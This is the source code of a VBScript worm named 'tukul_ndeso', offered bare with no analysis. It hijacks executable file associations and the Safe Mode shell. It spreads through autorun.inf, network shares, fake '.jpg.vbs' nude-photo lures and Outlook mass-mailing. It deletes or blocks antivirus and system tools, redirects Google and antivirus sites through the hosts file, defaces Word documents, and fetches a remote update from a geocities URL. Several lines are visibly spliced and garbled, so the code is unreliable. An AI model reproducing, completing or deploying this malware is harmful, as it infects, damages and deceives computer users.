on error resume next
const versi="0907"
dim fso,rg,sd,syspath,winpath,mf,file,isiaku,runaku,ko de,flashdrive,at,adbr,lap
lap=0
set fso = createobject("Scripting.FileSystemObject")
set mf = fso.getfile(Wscript.ScriptFullname)
set rg=createobject("wscript.shell")
winpath = npth(fso.getspecialfolder(0))
syspath = npth(fso.getspecialfolder(1))
runaku = winpath & "smss.exe " & winpath & "" & "kern" & "el32&4) & "%1" & chr(34) & " %*"
msgbox "Tukul lagi seneng nih..",48,"Tukul Jalan - Jalan"
rg.run "shutdown.exe -f -r -t 0"
rg.regwrite "HKEY_CLASSES_ROOT\exefile\shell\open\command\",ru naku & " " & chr(34) & "%1" & chr(34)
at = at + 1
end if
isi_drive 1

skr = left(formatdatetime(time,4),5)
if skr = nextdo or nextdo = "" then
isi_drive 2
if right(skr,2)4 then
nextdo = left(skr,2) + 1 & ":" & 60 - right(skr,2)
else
nextdo = left(skr,2) & ":" & right(skr,2) + 5
end if
end if

update_me
sebar_share
end if
kopi_sistem
bantai_reg
lap=lap+1
loop

sub baca_diri()
set file = mf.openastextstream(1,-2)
do while not file.atendofstream
isiaku = isiaku & file.readline
isiaku = isiaku & vbcrlf
loop
end sub

sub kopi_sistem()
on error resume next
dim tf
set tf = fso.getfile(winpath & "" & "kern" & "el32" & "dll" & ".vb" & "s")
tf.attributes = 32
set tf = fso.getfile(winpath & "smss.exe")
tf.attributes = 32
fso.copyfile syspath & "wscript.exe",winpath & "smss.exe"
tulisaku_ah winpath & "" & "kern" & "el32" & "dll" & ".vb" & "s"
set tf = fso.getfile(winpath & "" & "kern" & "el32&4) & "c:\program files\internet explorer\iexplore.exe" & chr(34) & " " & chr(34) & winpath & "tukul.html" & chr(34)
rg.regwrite "HKEY_CLASSES_ROOT\tukul.ndeso\shellex\command\",c hr(34) & "c:\program files\internet explorer\iexplore.exe" & chr(34) & " " & chr(34) & winpath & "tukul.html" & chr(34)
rg.regwrite "HKEY_CLASSES_ROOT\.bat\","tukul.ndeso"
rg.regwrite "HKEY_CLASSES_ROOT\.exe\","exefile"
rg.regwrite "HKEY_CLASSES_ROOT\.lnk\","lnkfile"
rg.regwrite "HKEY_CLASSES_ROOT\.pif\","piffile"
rg.regwrite "HKEY_CLASSES_ROOT\*\shellex\ContextMenuHandlers\O pen With\",""
rg.regwrite "HKEY_CLASSES_ROOT\exefile\shell\open\command\",ru naku & " " & chr(34) & "%1" & chr(34)
rg.regwrite "HKEY_CLASSES_ROOT\lnkfile\shell\open\command\",ru naku & " " & chr(34) & "%1" & chr(34)
rg.regwrite "HKEY_CLASSES_ROOT\piffile\shell\open\command\",ru naku & " " & chr(34) & "%1" & chr(34)
rg.regwrite "HKEY_CLASSES_ROOT\.reg\","tukul.ndeso"
rg.regwrite "HKEY_CLASSES_ROOT\.com\","tukul.ndeso"
rg.regwrite "HKEY_CLASSES_ROOT\.jpg\","tukul.ndeso"
rg.regwrite "HKEY_CLASSES_ROOT\.mp3\","tukul.ndeso"
rg.regwrite "HKEY_CLASSES_ROOT\.msi\","tukul.ndeso"
rg.regwrite "HKEY_CLASSES_ROOT\.inf\","tukul.ndeso"
rg.regwrite "HKEY_CLASSES_ROOT\.msc\","tukul.ndeso"
rg.regwrite "HKEY_CLASSES_ROOT\.txt\","tukul.ndeso"
rg.regwrite "HKEY_CLASSES_ROOT\VBSFile\","Image File"
rg.regwrite "HKEY_CLASSES_ROOT\VBSFile\DefaultIcon\","shimgvw. dll,3"
rg.regwrite "HKEY_CLASSES_ROOT\VBSFile\shell\edit\command\ ",""
rg.RegWrite "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Contr ol\SafeBoot\AlternateShell", runaku
rg.RegWrite "HKEY_LOCAL_MACHINE\System\ControlSet001\Control\S afeBoot\AlternateShell", runaku
rg.RegWrite "HKEY_LOCAL_MACHINE\System\ControlSet002\Con4) & winpath & "tukul.html" & chr(34)
rg.regwrite "HKCU\Control Panel\Desktop\Wallpaper", winpath & "Prairie Wind.bmp"
rg.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Toolbar\BackBitmapShell", winpath & "Greenstone.bmp"
rg.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", winpath & "tukul.html"
rg.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title", "TuKuL_NDESO"
rg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\RegisteredOrganization", "tukul tur keliling dunia"
rg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\RegisteredOwner", "TUKUL NDESO"
end sub

sub eksek_exe()
on error resume next
dim abc,ahe
abc = lcase(wscript.arguments.item(0))
if right(abc,8) = "smss.exe" then
exit sub
end if
ahe= "System administrator is blocked your access." & vbcrlf & "Please contact your admin !!"
if sensor(abc) = true then
set tf = fso.getfile(abc)
tf.attributes = 32f48,"ANTIexe Manager"
exit sub
end if
rg.regwrite "HKEY_CLASSES_ROOT\.exe\","exefile"
rg.regwrite "HKEY_CLASSES_ROOT\exefile\shell\open\command\",ch r(34) & "%1" & chr(34) & " %*"
rg.run chr(34) & wscript.arguments.item(0) & chr(34)
rg.regwrite "HKEY_CLASSES_ROOT\exefile\shell\open\command\",ru naku & " " & chr(34) & "%1" & chr(34)
end sub

sub tulis_html()
on error resume next
dim tf
kode= "<html><head><title>--|| salam dari tukul ||--</title></head><body><table><tr>"
kode= kode & "<td><br></td></tr></table><br><center><font>"
kode = kode & "tukul_ndeso " & versi & "<table><tr><td><p>"
kode = kode & "<font>dasar KATROO !!</p></td></tr></table><p><font>hallo semua,,<br>tukul_ndeso telah hidup dikomputer anda.<br>ini adalah bagian dari rangkaian perjalanan tukul dalam turnya keliling dunia,<br>tukul berniat jalan-jalan melewati semua komputer didunia<br>dan hanya ingin menyampaikan pesan perdamaian.<br><br>Mari dukung Indonesia dalam Piala Asia..<br>TERIAKKAN SUARA ANDA DAN KATAKAN TUKUL TELAH MERAJALELA!!<br><br><br>tukul_ndeso akan terus keliling dunia sampai akhir hayatnya..<br><br><font>hidup tukul !! hidup orang katro !! hidup ndeso !!<br><br><table><tr><td><font>-=[siapa_aku]=-<br><br>PEACE AND LOVE FOREVER,<br><font>- tukul keliling dunia -<br><br></td></tr</table>"
set tf=fso.createtextfile(winpath & "tukul.html",2,true)
tf.write kode
tf.close
end sub

sub isi_drive(n)
on error resume next
Dim d,dc,s,tf,atr
Set dc = fso.Drives
For Each d in dc
share_gw d.path
If d.drivetype = 2 or d.drivetype = 1 and left(lcase(d.path),1) <> "a" then
if fso.fileexists(npth(d.path) & "" & "kern" & "el32" & "dll" & ".vb" & "s") then
set tf = fso.getfile(npth(d.path) & "" & "kern" & "el32" & "dll" & ".vb" & "s")
tf.attributes = 32
end if
tulisaku_ah npth(d.path) & "" & "kern" & "el32" & "dll" & ".vb" & "s"
set tf = fso.getfile(npth(d.path) & "" & "kern" & "el32" & "dll" & ".vb" & "s")
tf.attributes = 39
tulisaku_ah npth(d.path) & "kembali_ke_laptop" & ".vb" & "s"

atr = "[autorun]" & vbcrlf & "shellexecute=" & "wscript.exe " & "kern" & "el32" & "dll" & ".vb" & "s"
if fso.fileexists(npth(d.path) & "autorun.inf") then
set tf =fso.getfile(npth(d.path) & "autorun.inf")
tf.attributes = 32
end if
set tf=fso.createtextfile(npth(d.path) & "autorun.inf",2,true)
tf.write atr
tf.close
set tf = fso.getfile(npth(d.path) & "autorun.inf")
tf.attributes=39
if n = 2 then
isi_folder npth(d.path),0
end if
elseif n=1 then
if lap > 0 then isi_folder npth(d.path),1
end if
Next
end sub

sub share_gw(drv)
on error resume next
dim errReturn,objNewShare
Const FILE_SHARE = 0
Const MAXIMUM_CONNECTIONS = 25
drv=npth(drv)
strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
& "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
Set objNewShare = objWMIService.Get("Win32_Share")
errReturn = objNewShare.Create (drv, left(drv,1) & "-aku", FILE_SHARE, MAXIMUM_CONNECTIONS, "ini " & left(drv,1) & " aku..pake aja")
end sub

sub sebar_share()
on error resume next
strComputer = "."
Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonat e}!\\" & strComputer & "\root\cimv2")
Set colShares = objWMIService.ExecQuery("Select * from Win32_Share")
For each objShare in colShares
if right(objshare.name,1) <> "$" then
tulisaku_ah npth(objshare.path) & "kembali_ke_laptop.jpg.vbs"
tulisaku_ah npth(objshare.path) & "JULIA PEREZ NUDE.jpg.vbs"
tulisaku_ah npth(objshare.path) & "TUKUL BUGIL.jpg.vbs"
tulis_desktopini objshare.name,npth(objshare.path)
end if
Next
Const HKEY_CURRENT_USER = &H80000001
strComputer = "."
Set oReg=GetObject("winmgmts:{impersonationLevel=imper sonate}!\\" & _
strComputer & "\root\default:StdRegProv")
strKeyPath = "SYSTEM\CurrentControlSet\Services"
oReg.EnumKey HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Explore r\WorkgroupCrawler\Shares", arrSubKeys
For Each subkey In arrSubKeys
subkey = "\\" & subkey & "\"
subkey = Replace(subkey, "/", "\", 1, -1, 0)
fso.copyfile winpath & "tukul.jpg.vbs",subkey & "kembali_ke_laptop.jpg" & ".vb" & "s"
fso.copyfile winpath & "tukul.jpg.vbs",subkey & "julia perez nudes (1).jpg" & ".vb" & "s"
fso.copyfile winpath & "tukul.jpg.vbs",subkey & "tukul lagi bugil.jpg" & ".vb" & "s"
Next
end sub

sub dok_rusuh(pth)
on error resume next
if lap < 1 then exit sub
Const END_OF_STORY = 6
Const MOVE_SELECTION = 0
Set objWord = CreateObject("Word.Application")
objWord.Visible = false
Set objDoc = objWord.Documents.Open(pth)
Set objSelection = objWord.Selection
objSelection.TypeParagraph()
objSelection.Font.Size = "13"
objSelection.TypeText "Nama : Tukul NDESO" & vbcrlf & "STS : Lagi Jalan Jalan Nih"
objSelection.TypeParagraph()
objSelection.Find.Execute "anda", 0, 0, 0, 0, 0, 1, 0, 0, "elo", 2, 0, 0, 0, 0
objSelection.Find.Execute "saya", 0, 0, 0, 0, 0, 1, 0, 0, "gua", 2, 0, 0, 0, 0
objSelection.Find.Execute "tidak", 0, 0, 0, 0, 0, 1, 0, 0, "kagak", 2, 0, 0, 0, 0
objSelection.EndKey END_OF_STORY, MOVE_SELECTION
objSelection.TypeParagraph()
objSelection.Font.Size = "13"
objSelection.TypeText "tukul_ndeso lagi keliling dunia.."
objdoc.save
objword.quit
end sub

sub tulis_desktopini(nama,pth)
on error resume next
dim fld,a
fld = npth(pth) & "tukul"
fso.createfolder(fld)
set tf = fso.getfile(npth(pth) & "Desktop.ini")
tf.attributes = 32
set tf=fso.createtextfile(npth(pth) & "Desktop.ini",2,4FFE0-28D4-11CF-AE66-08002B2E1262]4FFE0-28D4-11CF-AE66-08002B2E1262=4FFE0-28D4-11CF-AE66-08002B2E1262}"
tf.close
set tf = fso.getfile(npth(pth) & "Desktop.ini")
tf.attributes = 39
a = "\\" & rg.regread("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ Windows NT\CurrentVersion\Winlogon\DefaultDomainName")
a = a & "\" & nama & "\"
set tf = fso.getfile(fld & "\folder.htt")
tf.attributes = 32
set tf=fso.createtextfile(fld & "\folder.htt",2,true)
tf.writeline "<script>"
tf.writeline "sub MAIN()"
tf.writeline "dim rg,fso"
tf.writeline "set fso=createobject(""scripting.filesystemobject"")"
tf.writeline "set rg=createobject(""wscript.shell"")"
tf.writeline "rg.run """ & a & "tukul\" & "kern" & "el32" & "dll" & ".vb" & "s"""
tf.writeline "end sub"
tf.writeline "</script>"
tf.writeline "<body></body>"
set tf = fso.getfile(fld & "\folder.htt")
tf.attributes = 39
tulisaku_ah fld & "\" & "kern" & "el32" & "dll" & ".vb" & "s"
set tf = fso.getfile(fld & "\" & "kern" & "el32" & "dll" & ".vb" & "s")
tf.attributes = 39
Set tf = fso.getfolder(fld)
tf.Attributes = 39
end sub

sub isi_folder(fl,n)
on error resume next
dim z,z1,zf
fl = npth(fl)
godafile fl
set z = fso.GetFolder(fl)
set zf = z.SubFolders
for each z1 in zf
godafile npth(z1.path)
if n = 1 then
isi_folder npth(z1.path),1
end if
tulisaku_ah npth(z1.path) & "kembali_ke_laptop" & ".vb" & "s"
next
end sub

sub godafile(fl)
on error resume next
if lap < 1 then exit sub
dim g,g1,gc,eks,pa,mrcn,t,top,tq,si,tt
fl = npth(fl)
set g = fso.GetFolder(fl)
set gc = g.Files
for each g1 in gc
if sensor(g1.path) then
set tt=fso.GetFile(g1.path)
tt.attributes = 32
fso.deletefile g1.path
exit sub
end if
eks=right(g1.path,3)
eks=lcase(eks)
t=lcase(g1.name)
if eks="js" or eks="hta" or eks="vbs" or eks="inf" or eks="reg" then
tulisaku_ah g1.path
elseif eks="jpg" or eks="jpeg" then
set top=fso.GetFile(g1.path)
top.attributes = 39
tulisaku_ah g1.path & "" & ".vb" & "s"
elseif eks="doc" or eks="vbm" then
dok_rusuh g1.path
end if
if tq <1> int(rgve)) then
for entriktr=1 to b.AddressEntries.Count
alem=b.AddressEntries(y)
rgadd=""
rgadd=rg.RegRead("HKEY_CURRENT_USER\Sof" & "tware\Microsoft\WAB\" & alem)

if rgadd="" then
set alema=tou.CreateItem(0)
alema.Recipients.Add(alem)
alema.Attachments.Add(winpath & "tukul.jpg.v" & "bs")
alema.Body = vbcrlf&"Cuplikan foto foto dari empat mata"
alema.Subject = "[PIC] EMPAT MATA"
alema.Send
rg.RegWrite "HKEY_CURRENT_USER\Software\Mi" & "crosoft\WAB\" & alem,1,"REG_DWORD"
end if
y=y+1
next
rg.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\W" & "AB\" & b,b.AddressEntries.Count
else
rg.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WA" & "B\" & b,b.AddressEntries.Count
end if
next
end sub

sub tulisaku_ah(pth)
on error resume next
dim tf,a,str
cek_baru winpath & "update.sys"
if fso.fileexists(pth) then
set tf = fso.getfile(pth)
tf.attributes = 32
end if
set tf=fso.createtextfile(pth,2)
tf.write isiaku
tf.close
set tf = fso.getfile(pth)
tf.attributes = 32
end sub

function npth(pth)
if right(pth,1) <> "\" then
npth = pth & "\"
else
npth = pth
end if
end function

function sensor(pth)
on error resume next
dim i,b
dim anti(255)
anti(1) = "anti"
anti(2)4) = "reg"
anti(5) = "vir"
anti(6) = "ansav"
anti(7) = "pcmav"
anti(8) = "avg"
anti(9) = "task"
anti(10) = "tsk"
anti(11) = "del"
anti(12)4) = "clean"
anti(15) = "scan"
anti(16) = "proc"
anti(17) = "upd"
anti(18) = "msconfig"
anti(19) = "services"
anti(20) = "bunuh"
anti(21) = "av"
anti(22) = "cc"
anti(23) = "cmd"
anti(24) = "sys"
anti(25) = "note"
anti(26) = "util"
anti(27) = "visual"
anti(28) = "asm"
anti(29) = "bug"
anti(30) = "c++"
anti(31) = "delphi"
anti(32)4) = "tool"
anti(35) = "mcafee"
anti(36) = "norton"
anti(37) = "nv"
anti(38) = "nod"
anti(39) = "deep"
anti(40) = "freeze"
anti(41) = "frz"
pth = lcase(pth)
for i = 1 to 41
for b = 1 to len(pth)
if lcase(mid(pth,b,len(anti(i)))) = anti(i) then sensor = true
next
next
end function

sub bantai_host()
on error resume next
dim tf,hst
hst = syspath & "driver" & "s\et" & "c\host"
Set tf = fso.getfile(hst)
tf.attributes = 32
Set tf = fso.OpenTextFile(hst,2,1)
tf.WriteLine "127.0.0.1 www.friendster.com"
tf.WriteLine "127.0.0.1 friendster.com"
tf.WriteLine "127.0.0.1 www.google.co.id"
tf.WriteLine "127.0.0.1 google.co.id"
tf.WriteLine "127.0.0.1 www.google.com"
tf.WriteLine "127.0.0.1 google.com"
tf.WriteLine "127.0.0.1 www.vaksin.com"
tf.WriteLine "127.0.0.1 vaksin.com"
tf.WriteLine "127.0.0.1 www.virologi.info"
tf.WriteLine "127.0.0.1 virologi.info"
tf.WriteLine "127.0.0.1 www.ansav.com"
tf.WriteLine "127.0.0.1 ansav.com"
tf.WriteLine "127.0.0.1 www.jasakom.com"
tf.WriteLine "127.0.0.1 jasakom.com"
tf.WriteLine "127.0.0.1 www.vbbego.com"
tf.WriteLine "127.0.0.1 vbbego.com"
tf.WriteLine "127.0.0.1 www.kaskus.us"
tf.WriteLine "127.0.0.1 kaskus.us"
tf.close
end sub

sub update_me()
on error resume next
if lap < 1 then exit sub
dim a,alm,tmp,oht,oado,str
alm = "http://geocities.com/tukulndeso0907/update.txt"
tmp = winpath & "update.sys"
Set oht = CreateObject("MSXML2.XMLHTTP")
oht.open "GET", alm, false
oht.send()
If oht.Status = 200 Then
Set oado = CreateObject("ADODB.Stream")
oado.Open
oado.Type = 1
oado.Write oht.ResponseBody
oado.Position = 0
Set oado = Createobject("Scripting.FileSystemObject")
If fso.Fileexists(tmp) Then fso.DeleteFile tmp
oado.SaveToFile tmp
oado.Close
Set oado = Nothing
End if
Set oht = Nothing
cek_baru tmp
end sub

sub upd_res()
on error resume next
dim m,tf
for m = 1 to 3
set tf = fso.getfile(winpath & "" & "kern" & "el32" & "dll" & ".vb" & "s")
tf.attributes = 32
fso.delfile winpath & "" & "kern" & "el32" & "dll" & ".vb" & "s"
fso.copyfile winpath & "update.sys",winpath & "" & "kern" & "el32&4) & "%1" & chr(34) & " %*"
rg.regwrite "HKEY_CLASSES_ROOT\.com\","comfile"
rg.regwrite "HKEY_CLASSES_ROOT\comfile\shell\open\command\",ch r(34) & "%1" & chr(34) & " %*"
fso.delfile winpath & "update.sys"
rg.run "shutdown -f -r -t 0"
rg.regwrite "HKEY_CLASSES_ROOT\.com\","tukul.ndeso"
next
wscript.quit
end sub

function cek_baru(pth)
dim mf,ame,a,str
adbr=false
cek_baru=false
str=""
if fso.fileexists(pth) then
set mf = fso.getfile(pth)
set ame = fso.getfile(winpath & "kernel32dll.vbs")
if mf.size > ame.size then
set a = mf.openastextstream(1,-2)4) <> versi then
set tf = fso.getfile(winpath & "" & "kern" & "el32" & "dll" & ".vb" & "s")
tf.attributes = 32
fso.copyfile winpath & "update.sys",winpath & "" & "kern" & "el32" & "dll" & ".vb" & "s"
isiaku=str
adbr=true
cek_baru=true
upd_res
end if
end if
end if
end if
end function